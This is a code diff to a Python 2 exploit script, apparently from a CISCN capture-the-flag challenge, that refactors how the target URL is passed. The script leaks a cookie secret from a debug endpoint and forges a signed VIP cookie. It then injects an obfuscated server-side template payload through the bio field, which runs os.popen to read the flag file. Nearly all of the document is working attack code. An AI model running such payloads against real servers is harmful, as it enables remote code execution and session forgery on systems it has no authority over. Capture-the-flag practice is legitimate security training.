@@ -60,7 +60,7 @@ def get_token(html, csrfname):
     token = str(PQ(form)("input[name=\"%s\"]" % csrfname).attr("value")).strip()
     return token
 
-def register(s, username, password, mail, csrfname, invite=''):
+def register(s, username, password, mail, csrfname, url, invite=''):
     rs = s.get(url + 'register')
     html = rs.text
     token = get_token(html, csrfname)
@@ -89,7 +89,7 @@ def register(s, username, password, mail, csrfname, invite=''):
     print "[+] Register Success."
     return True
 
-def login(s, username, password, mail, csrfname):
+def login(s, username, password, mail, csrfname, url):
     rs = s.get(url + 'login')
     html = rs.text
     token = get_token(html, csrfname)
@@ -115,48 +115,72 @@ def login(s, username, password, mail, csrfname):
     print "[+] Login Success."
     return True
 
-def write_bio(s, payload, csrfname):
+def write_bio(s, payload, csrfname, url):
     rs = s.get(url + 'user')
     html = rs.text
     token = get_token(html, csrfname)
-    s.post(url + "user", data={
+    rs = s.post(url + "user", data={
         csrfname: token,
         "bio": payload
     })
+    dom = PQ(rs.text)
+    success = dom("div.alert.alert-success")
+    success = PQ(success).text().strip()
+    if len(success):
+        print "[+] Write Bio Success"
+        return True
+    return False
 
-def read_bio(s):
+
+def read_bio(s, url):
     rs = s.get(url + 'bio')
     flag = rs.text
-    print flag
+    flag = flag.strip()
+    if re.match(r"CISCN{.*}",flag):
+        print "[+] Read Bio Success"
+        print flag
+        return True
+    print "[-] Read flag Failed"
+    return False
 
-def get_secret(s):
+def get_secret(s, url):
     rs = s.get(url + "debugggg?info=data")
     return re.findall(r"cookie_secret = '(.*?)'", rs.text)[0]
 
-if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print 'Usage: %s ip port csrfname' % sys.argv[0]
-        print 'Default port is 80'
-        print 'Default csrfname is "_xsrf"'
-        sys.exit(0)
-
-    ip = sys.argv[1]
-    port = sys.argv[2] if len(sys.argv) >= 3 else '80'
-    csrfname = sys.argv[3] if len(sys.argv) >= 4 else '_xsrf'
-
+def _exp(ip, port):
+    csrfname = "_xsrf"
     url = "http://%s:%s/" % (ip, port)
     name = generate_randstr(6)
     password = "hhhhh"
     email = generate_randstr(6) + "@t.com"
 
     s = requests.session()
-    secret = get_secret(s)
+    secret = get_secret(s, url)
 
-    if register(s, name, password, email, csrfname):
-        login(s, name, password, email, csrfname)
+    if register(s, name, password, email, csrfname, url):
+        login(s, name, password, email, csrfname, url)
         isvip = sign_cookie("isvip", "1", secret)
         s.cookies.set("isvip", isvip, domain=ip)
         payload = r"""{% raw ().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]["ev""al"]("__imp""ort__(\x27o""s\x27).__dict__[\x27po""pen\x27](\x27cat /home/ctf/flag\x27).read()") %}"""
-        write_bio(s, payload, csrfname)
-        # get flag
-        read_bio(s)
+        if write_bio(s, payload, csrfname, url):
+            # get flag
+            return read_bio(s, url)
+        return False
+
+def exp(host, port):
+    attack = False
+
+    try:
+        attack = _exp(host,port)
+    except:
+        print "[-] Attack Failed"
+        attack = False
+
+    if attack:
+        return True
+    else:
+        return False
+
+
+if __name__ == "__main__":
+    exp("127.0.0.1","8233")
